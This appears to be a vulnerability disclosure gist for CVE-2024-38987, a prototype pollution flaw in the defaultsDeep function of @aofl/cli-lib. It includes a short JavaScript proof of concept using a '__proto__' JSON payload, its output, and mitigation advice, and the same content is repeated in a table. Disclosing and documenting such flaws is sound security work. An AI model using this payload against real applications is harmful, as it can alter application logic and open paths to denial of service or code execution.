[CVE-2024-38987] Prototype Pollution vulnerability affecting aofl/cli-lib module, versions <= 3.14.0

 [Raw](/mestrtee/29636943e6989e67f38251580cbcea73/raw/e4a9703a5b03f22d7edd3c6b22466dd8f71b84ea/aofl-cli-lib-pp.md)

[**aofl-cli-lib-pp.md**](#file-aofl-cli-lib-pp-md)

**SVSS Score**

6.3 MEDIUM

### Overview

All versions of this module are vulnerable to Prototype Pollution via `defaultsDeep`. The user's supplied value recursively copy all child properties to the destination without proper security validation.

An attacker can be exploit this method to inject malicious payload via built-in `Object` through the special properties `__proto__` or `constructor.prototype`.
Thus, the attacker can use one of these properties to pollute the application logic that can be escalated to Denial of service,
remote code execution or cross-site scripting attacks.

### Call stack:

```
defaultsDeep (@aofl/cli-lib/modules/defaults.js:13)

```
### PoC

```
(async () => {
  const lib = await import('@aofl/cli-lib');
var BAD_JSON = JSON.parse('{"__proto__":{"polluted":true}}')

var victim = {}
console.log("Before Attack: ", JSON.stringify(victim.__proto__));
try {
	lib.defaultsDeep ({}, BAD_JSON)
} catch (e) { }
console.log("After Attack: ", JSON.stringify(victim.__proto__));
delete Object.prototype.polluted;
})();
```

Output:

```
Before Attack:  {}
After Attack:  {"polluted":true}

```

Expected output after the patch:

```
Before Attack:  {}
After Attack:  {}

```
### How to prevent:

No updates were provided by the maintainer. Users of this module are urged to implement proper santization and validation over user's supplied inputs, such as blocking inputs containing `__proto__` and `contructor.prototype`

| All versions of this module are vulnerable to Prototype Pollution via `defaultsDeep`. The user's supplied value recursively copy all child properties to the destination without proper security validation.  An attacker can exploit this vulnerability by manipulate the prototype of Object by modify built-in Object.prototype through reachable special properties `__proto__` or `constructor.prototype`. Potentially leading to the alteration of behavior of all objects and consequently, the attacker escalate the attack to denial of service, remote code execution or privilege escalation. Call stack: ``` defaultsDeep (@aofl/cli-lib/modules/defaults.js:13)  ``` PoC: ``` (async () => {   const lib = await import('@aofl/cli-lib'); var BAD_JSON = JSON.parse('{"__proto__":{"polluted":true}}')  var victim = {} console.log("Before Attack: ", JSON.stringify(victim.__proto__)); try { 	lib.defaultsDeep ({}, BAD_JSON) } catch (e) { } console.log("After Attack: ", JSON.stringify(victim.__proto__)); delete Object.prototype.polluted; })(); ```  Output:  ``` Before Attack:  {} After Attack:  {"polluted":true}  ```  Expected output after the patch:  ``` Before Attack:  {} After Attack:  {}  ``` How to prevent:  * Freeze the root prototype using Object.freeze * Require schema validation of JSON input. * Avoid using unsafe recursive merge functions. * Consider using objects without prototypes (for example, Object.create(null)), breaking the prototype chain and preventing pollution. * As a best practice use Map instead of Object |
